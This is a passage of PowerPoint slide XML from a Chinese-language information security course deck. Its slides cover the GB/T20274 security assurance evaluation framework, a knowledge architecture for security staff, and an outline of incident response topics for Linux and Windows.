        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="矩形 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="628650" y="4005064"/>
            <a:ext cx="7648575" cy="1311128"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="533400" indent="-533400" eaLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="110000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="3399FF"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="v"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>最终得出信息系统在其运行环境中安全保障措施满足其安全保障要求的符合性，以及信息系统安全保障能力的评估</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="556545565"/>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4113" y="693322"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>信息系统安全测评标准</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="内容占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="514350" y="1352550"/>
            <a:ext cx="8191500" cy="1407232"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>信息系统安全测评标准是</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>GB/T20274 《</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>信息系统安全保障评估框架</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>》</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>，它为信息系统安全测评提供了思路框架和操作规范</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="5" name="Object 2"/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noChangeAspect="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4244241905"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="1475656" y="2573250"/>
          <a:ext cx="3633788" cy="3308350"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/presentationml/2006/ole">
            <mc:AlternateContent xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006">
              <mc:Choice xmlns:v="urn:schemas-microsoft-com:vml" Requires="v">
                <p:oleObj r:id="rId2" imgW="2291182" imgH="2309165" progId="Visio.Drawing.11">
                  <p:embed/>
                </p:oleObj>
              </mc:Choice>
              <mc:Fallback>
                <p:oleObj r:id="rId2" imgW="2291182" imgH="2309165"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2573250"/>
                        <a:ext cx="3633788" cy="3308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10"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5580112" y="2759782"/>
            <a:ext cx="1606550" cy="519113"/>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zh-CN" altLang="en-US" sz="2800"/>
              <a:t>保障要素</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text Box 11"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5580112" y="3623382"/>
            <a:ext cx="1606550" cy="51911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zh-CN" altLang="en-US" sz="2800"/>
              <a:t>生命周期</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text Box 12"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5580112" y="4544132"/>
            <a:ext cx="1606550" cy="51911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zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>信息特征</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="11645041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ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="2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7" grpId="0" animBg="1"/>
      <p:bldP spid="8"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34244" y="704894"/>
            <a:ext cx="7022132" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>网络空间安全人员的知识体系架构</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="5" name="对象 4"/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noChangeAspect="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3689530473"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="649660" y="1403656"/>
          <a:ext cx="7920880" cy="4761648"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/presentationml/2006/ole">
            <mc:AlternateContent xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006">
              <mc:Choice xmlns:v="urn:schemas-microsoft-com:vml" Requires="v">
                <p:oleObj name="Visio" r:id="rId2" imgW="4893758" imgH="3454880" progId="Visio.Drawing.11">
                  <p:embed/>
                </p:oleObj>
              </mc:Choice>
              <mc:Fallback>
                <p:oleObj name="Visio" r:id="rId2" imgW="4893758" imgH="3454880"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660" y="1403656"/>
                        <a:ext cx="7920880" cy="4761648"/>
                      </a:xfrm>
                      <a:prstGeom prst="rect">
                        <a:avLst/>
                      </a:prstGeom>
                      <a:noFill/>
                    </p:spPr>
                  </p:pic>
                </p:oleObj>
              </mc:Fallback>
            </mc:AlternateContent>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1345834286"/>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825693"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>课程内容</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="83" name="AutoShape 4"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="647564" y="3403360"/>
            <a:ext cx="1785938" cy="556655"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16667"/>
            </a:avLst>
          </a:prstGeom>
          <a:gradFill rotWithShape="1">
            <a:gsLst>
              <a:gs pos="0">
                <a:srgbClr val="99CCFF"/>
              </a:gs>
              <a:gs pos="100000">
                <a:srgbClr val="99CCFF">
                  <a:gamma/>
                  <a:tint val="27451"/>
                  <a:invGamma/>
                </a:srgbClr>
              </a:gs>
            </a:gsLst>
            <a:lin ang="5400000" scaled="1"/>
          </a:gradFill>
          <a:ln w="38100">
            <a:solidFill>
              <a:srgbClr val="3366FF"/>
            </a:solidFill>
            <a:round/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" eaLnBrk="0" hangingPunct="0"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="040404"/>
                </a:solidFill>
              </a:rPr>
              <a:t>应急响应</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="89" name="Text Box 5"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="862844" y="5697078"/>
            <a:ext cx="1365250"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知识体</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="95" name="Text Box 6"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3239852" y="5688207"/>
            <a:ext cx="1365250"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知识域</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="96" name="AutoShape 7"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2557867" y="2376692"/>
            <a:ext cx="429957" cy="2622428"/>
          </a:xfrm>
          <a:prstGeom prst="leftBrace">
            <a:avLst>
              <a:gd name="adj1" fmla="val 72540"/>
              <a:gd name="adj2" fmla="val 50000"/>
            </a:avLst>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="38100">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:round/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="36000" rIns="36000" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="97" name="AutoShape 9"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3053507" y="2132608"/>
            <a:ext cx="1806525" cy="495259"/>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事件分类和</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>应急响应流程</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="98" name="AutoShape 11"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3094259" y="3427325"/>
            <a:ext cx="1776266"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应急响应处理</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="99" name="Text Box 12"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5867400" y="5661074"/>
            <a:ext cx="2160984"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知识子域</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="100" name="Group 13"/>
          <p:cNvGrpSpPr>
            <a:grpSpLocks/>
          </p:cNvGrpSpPr>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="5361414" y="2996952"/>
            <a:ext cx="2738978" cy="371103"/>
            <a:chOff x="535" y="663"/>
            <a:chExt cx="1142" cy="272"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="101" name="Group 14"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="535" y="663"/>
              <a:ext cx="1139" cy="272"/>
              <a:chOff x="2272" y="1479"/>
              <a:chExt cx="1363" cy="1800"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="103" name="AutoShape 15"/>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04" name="AutoShape 16"/>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05" name="AutoShape 17"/>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06" name="AutoShape 18"/>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02" name="Rectangle 19"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="586" y="663"/>
              <a:ext cx="1091" cy="271"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="9525">
              <a:noFill/>
              <a:miter lim="800000"/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
            <a:effectLst/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr>
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="040404"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>Linux</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="040404"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>应急响应</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="zh-CN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="040404"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="107" name="Group 20"/>
          <p:cNvGrpSpPr>
            <a:grpSpLocks/>
          </p:cNvGrpSpPr>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="5344241" y="3491982"/>
            <a:ext cx="2756151" cy="371103"/>
            <a:chOff x="535" y="663"/>
            <a:chExt cx="1142" cy="272"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="108" name="Group 21"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="535" y="663"/>
              <a:ext cx="1139" cy="272"/>
              <a:chOff x="2272" y="1479"/>
              <a:chExt cx="1363" cy="1800"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="110" name="AutoShape 22"/>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11" name="AutoShape 23"/>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12" name="AutoShape 24"/>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13" name="AutoShape 25"/>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09" name="Rectangle 26"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="586" y="663"/>
              <a:ext cx="1091" cy="271"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="9525">
              <a:noFill/>
              <a:miter lim="800000"/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
            <a:effectLst/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr>
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="040404"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>Windows</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="040404"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>应急响应</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="zh-CN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="040404"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="121" name="AutoShape 56"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4873341" y="3180030"/>
            <a:ext cx="418739" cy="1002634"/>
          </a:xfrm>
          <a:prstGeom prst="leftBrace">
            <a:avLst>
              <a:gd name="adj1" fmla="val 77423"/>
              <a:gd name="adj2" fmla="val 51567"/>
            </a:avLst>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="38100">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:round/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="123" name="Group 58"/>
          <p:cNvGrpSpPr>
            <a:grpSpLocks/>
          </p:cNvGrpSpPr>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="5359650" y="3980123"/>
            <a:ext cx="2733478" cy="411940"/>
            <a:chOff x="535" y="663"/>
            <a:chExt cx="1142" cy="272"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="124" name="Group 59"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="535" y="663"/>
              <a:ext cx="1139" cy="272"/>
              <a:chOff x="2272" y="1481"/>
              <a:chExt cx="1363" cy="1802"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="126" name="AutoShape 60"/>
              <p:cNvSpPr>
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="gray">
              <a:xfrm>
                <a:off x="2272" y="1481"/>
                <a:ext cx="1363" cy="1802"/>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27" name="AutoShape 61"/>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28" name="AutoShape 62"/>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29" name="AutoShape 63"/>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dirty="0"/>
              </a:p>
            </p:txBody>
          </p:sp>
        </p:grpSp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="125" name="Rectangle 64"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="586" y="663"/>
              <a:ext cx="1091" cy="224"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="9525">
              <a:noFill/>
              <a:miter lim="800000"/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
            <a:effectLst/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr>
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="040404"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>其他应急响应</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="040404"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="130" name="Line 95"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2888574" y="2082659"/>
            <a:ext cx="27242" cy="3425528"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="38100">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:prstDash val="dash"/>
            <a:round/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="138" name="AutoShape 11"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3131840" y="4680835"/>
            <a:ext cx="1710531"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常见事件和</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>案例分析</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="139" name="Group 42"/>
          <p:cNvGrpSpPr>
            <a:grpSpLocks/>
          </p:cNvGrpSpPr>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="5364089" y="4555895"/>
            <a:ext cx="2729040" cy="437060"/>
            <a:chOff x="535" y="663"/>
            <a:chExt cx="1142" cy="272"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="140" name="Group 43"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="535" y="663"/>
              <a:ext cx="1139" cy="272"/>
              <a:chOff x="2272" y="1479"/>
              <a:chExt cx="1363" cy="1800"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="142"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43"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44"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45"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41"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应急响应事件监测</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="zh-CN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="040404"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="146" name="AutoShape 57"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4960761" y="4618549"/>
            <a:ext cx="331319" cy="781626"/>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a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="147" name="Group 42"/>
          <p:cNvGrpSpPr>
            <a:grpSpLocks/>
          </p:cNvGrpSpPr>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="5364088" y="5107131"/>
            <a:ext cx="2721859" cy="437060"/>
            <a:chOff x="535" y="663"/>
            <a:chExt cx="1142" cy="272"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="148" name="Group 43"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="535" y="663"/>
              <a:ext cx="1139" cy="272"/>
              <a:chOff x="2272" y="1479"/>
              <a:chExt cx="1363" cy="1800"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="15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51"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5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5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49"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常见事件和案例分析</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="154" name="Line 95"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5292080" y="1700808"/>
            <a:ext cx="0" cy="3807379"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="38100">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:prstDash val="dash"/>
            <a:round/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="65" name="Group 42"/>
          <p:cNvGrpSpPr>
            <a:grpSpLocks/>
          </p:cNvGrpSpPr>
          <p:nvPr/>
        </p:nvGrpSpPr>
